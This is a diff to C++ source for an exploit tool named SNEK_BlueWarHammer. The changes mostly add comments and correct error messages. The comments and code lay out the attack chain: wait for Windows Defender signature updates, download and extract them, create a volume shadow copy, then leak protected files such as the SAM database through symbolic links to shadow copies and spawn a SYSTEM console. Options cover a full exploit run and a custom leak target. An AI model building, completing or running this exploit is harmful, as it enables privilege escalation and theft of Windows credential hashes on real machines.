@@ -201,43 +201,47 @@ typedef union Version {
 void* cabbuff2 = NULL;
 DWORD cabbuffsz = 0;
 struct CabOpArguments {
-	ULONG index;
-	char* filename;
-	size_t ptroffset;
-	char* buff;
-	DWORD FileSize;
-	CabOpArguments* first;
-	CabOpArguments* next;
+	// Arguments for CAB file extraction operations
+	ULONG index;        // File index in CAB
+	char* filename;     // File name
+	size_t ptroffset;   // Pointer offset
+	char* buff;         // Buffer for file data
+	DWORD FileSize;     // Size of file
+	CabOpArguments* first; // First in list
+	CabOpArguments* next;   // Next in list
 };
 
 struct UpdateFiles {
-	char filename[MAX_PATH];
-	void* filebuff;
-	DWORD filesz;
-	bool filecreated;
-	UpdateFiles* next;
+	// Structure for storing extracted update files
+	char filename[MAX_PATH]; // File name
+	void* filebuff;          // File buffer
+	DWORD filesz;            // File size
+	bool filecreated;        // Whether file was created
+	UpdateFiles* next;       // Next in list
 };
 ///////////////////////////////////////
 
 
 // structures and global vars used by volume shadow copy functions
 struct cldcallbackctx {
-
-	HANDLE hnotifywdaccess;
-	HANDLE hnotifylockcreated;
-	wchar_t filename[MAX_PATH];
+	// Context for cloud filter callback operations
+	HANDLE hnotifywdaccess;     // Event for WD access notification
+	HANDLE hnotifylockcreated;  // Event for lock creation notification
+	wchar_t filename[MAX_PATH]; // File name being processed
 };
 
 struct LLShadowVolumeNames
 {
-	wchar_t* name;
-	LLShadowVolumeNames* next;
+	// Linked list of shadow volume names
+	wchar_t* name;              // Volume name
+	LLShadowVolumeNames* next;  // Next in list
 };
 
 struct cloudworkerthreadargs {
-	HANDLE hlock;
-	HANDLE hcleanupevent;
-	HANDLE hvssready;
+	// Arguments for cloud worker thread
+	HANDLE hlock;           // Lock handle
+	HANDLE hcleanupevent;   // Cleanup event
+	HANDLE hvssready;       // VSS ready event
 };
 ///////////////////////////////////////
 
@@ -260,16 +264,17 @@ void __RPC_USER midl_user_free(void __RPC_FAR* p)
 // Functions required by RPC end
 /////////////////////////////////////////////////////////////////////
 
+// Command-line options structure for SNEK_BlueWarHammer
 struct SNEK_BlueWarHammerOptions
 {
-	bool showHelp;
-	bool checkUpdatesOnly;
-	bool downloadOnly;
-	bool triggerVssOnly;
-	bool disableSpawn;
-	bool logSteps;
-	bool fullExploit;
-	wchar_t leakTarget[MAX_PATH];
+	bool showHelp;              // Display help information
+	bool checkUpdatesOnly;      // Only check for Defender updates, don't exploit
+	bool downloadOnly;          // Download and extract updates only
+	bool triggerVssOnly;        // Trigger VSS creation only
+	bool disableSpawn;          // Disable shell spawning after exploit
+	bool logSteps;              // Enable verbose logging of exploit steps
+	bool fullExploit;           // Perform full exploitation chain
+	wchar_t leakTarget[MAX_PATH]; // Custom file to leak (default: SAM)
 	SNEK_BlueWarHammerOptions()
 		: showHelp(false), checkUpdatesOnly(false), downloadOnly(false), triggerVssOnly(false), disableSpawn(false), logSteps(false), fullExploit(true)
 	{
@@ -277,6 +282,7 @@ struct SNEK_BlueWarHammerOptions
 	}
 };
 
+// Print command-line usage information
 void PrintUsage(wchar_t* programName)
 {
 	wprintf(L"Usage: %s [options]\n", programName);
@@ -288,6 +294,7 @@ void PrintUsage(wchar_t* programName)
 	wprintf(L"  --help               Show this help text\n");
 }
 
+// Parse command-line arguments into options structure
 bool ParseSNEK_BlueWarHammerOptions(int argc, wchar_t* argv[], SNEK_BlueWarHammerOptions& opts)
 {
 	for (int i = 1; i < argc; i++)
@@ -356,6 +363,7 @@ void FreeUpdateFilesList(UpdateFiles* list)
 
 bool DownloadUpdateFilesOnly()
 {
+	// Download and extract Windows Defender update files without triggering VSS
 	int filecount = 0;
 	UpdateFiles* list = GetUpdateFiles(&filecount);
 	if (!list)
@@ -375,6 +383,7 @@ bool DownloadUpdateFilesOnly()
 
 bool TriggerVssOnly(wchar_t* fullvsspath)
 {
+	// Trigger VSS creation only, without performing the full exploit
 	HANDLE hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!hreleaseready)
 	{
@@ -966,9 +975,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		return false;
 	}
 
-
-
-
+	// Create Windows Update session
 	hr = CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (LPVOID*)&updsess);
 
 	if (!updsess)
@@ -977,51 +984,49 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("CoCreateInstance : 0x%p\n", updsess);
 
-
+	// Create update searcher
 	hr = updsess->CreateUpdateSearcher(&updsrch);
 	if (hr)
 	{
-		printf("IUpdateSearcher->CreateUpdateSearcher failed with error : 0x%0.X", hr);
+		printf("IUpdateSession->CreateUpdateSearcher failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
 
 	if (!updsrch)
 	{
-		printf("IUpdateSearcher->CreateUpdateSearcher returned a NULL pointer.\n");
+		printf("IUpdateSession->CreateUpdateSearcher returned a NULL pointer.\n");
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateSearcher->CreateUpdateSearcher : 0x%p\n", updsrch);
-	//printf("Checking for updates, please wait...\n");
+
+	// Search for available updates
 	hr = updsrch->Search(SysAllocString(L""), &srchres);
 	if (hr)
 	{
-		printf("ISearchResult->Search failed with error : 0x%0.X", hr);
+		printf("IUpdateSearcher->Search failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("ISearchResult->Search : 0x%p\n", srchres);
 
+	// Get updates collection
 	hr = srchres->get_Updates(&updcollection);
 	if (hr)
 	{
-		printf("IUpdateCollection->get_Updates failed with error : 0x%0.X", hr);
+		printf("ISearchResult->get_Updates failed with error : 0x%0.X", hr);
 		*criterr = true;
 		goto cleanup;
 	}
 
 	if (!updcollection)
 	{
-		printf("IUpdateCollection->get_Updates returned a NULL pointer.\n");
+		printf("ISearchResult->get_Updates returned a NULL pointer.\n");
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("IUpdateCollection->get_Updates : 0x%p\n", updcollection);
 
-
+	// Get update count
 	hr = updcollection->get_Count(&updnum);
 	if (hr)
 	{
@@ -1029,8 +1034,8 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		*criterr = true;
 		goto cleanup;
 	}
-	//printf("Updates count : %d\n", updnum);
 
+	// Iterate through available updates
 	for (LONG i = 0; i < updnum; i++)
 	{
 		if (upd)
@@ -1501,6 +1506,8 @@ cleanup:
 
 DWORD GetWDPID()
 {
+	// Get the process ID of the Windows Defender service
+	// Used to identify the target process for exploitation
 	static DWORD retval = 0;
 	if (retval)
 		return retval;
@@ -3295,6 +3302,9 @@ void LaunchConsoleInSessionId(DWORD sessionid)
 
 int wmain(int argc, wchar_t* argv[])
 {
+	// Main entry point for SNEK_BlueWarHammer exploit
+	// Performs Windows Defender update exploitation to achieve privilege escalation
+
 	SNEK_BlueWarHammerOptions opts;
 	if (!ParseSNEK_BlueWarHammerOptions(argc, argv, opts))
 	{
@@ -3308,6 +3318,7 @@ int wmain(int argc, wchar_t* argv[])
 		return 0;
 	}
 
+	// Check if running as SYSTEM (elevated mode)
 	if (IsRunningAsLocalSystem())
 	{
 		printf("Running as local system.\n");
@@ -3326,6 +3337,7 @@ int wmain(int argc, wchar_t* argv[])
 		return 0;
 	}
 
+	// Log options if verbose mode enabled
 	if (opts.logSteps)
 	{
 		printf("[+] Starting SNEK_BlueWarHammer with options:\n");
@@ -3430,8 +3442,8 @@ int wmain(int argc, wchar_t* argv[])
 
 	try {
 
-// Poll the Windows Update Agent until a Defender signature update is available.
-	printf("Checking for windows defender signature updates...\n");
+		// Step 1: Wait for Windows Defender signature updates
+		printf("Checking for windows defender signature updates...\n");
 		while (!CheckForWDUpdates(updtitle, &criterr)){
 
 			if (criterr)
@@ -3448,6 +3460,7 @@ int wmain(int argc, wchar_t* argv[])
 			return 0;
 		}
 
+		// Step 2: Download and extract update files
 		if (opts.downloadOnly)
 		{
 			if (!DownloadUpdateFilesOnly())
@@ -3475,6 +3488,7 @@ int wmain(int argc, wchar_t* argv[])
 			return 0;
 		}
 
+		// Step 3: Create VSS snapshot and trigger Defender processing
 		printf("Creating VSS copy...\n");
 		hreleaseready = CreateEvent(NULL, FALSE, FALSE, NULL);
 		if (!hreleaseready)
@@ -3489,7 +3503,7 @@ int wmain(int argc, wchar_t* argv[])
 		if (!isvssready)
 			goto cleanup;
 
-		// Iterate through protected targets and attempt to leak each one.
+		// Step 4: Leak protected files using symbolic links to shadow copies
 		for (int x = 0; x < sizeof(filestoleak) / sizeof(wchar_t*); x++)
 		{
 			UpdateFilesListCurrent = UpdateFilesList;
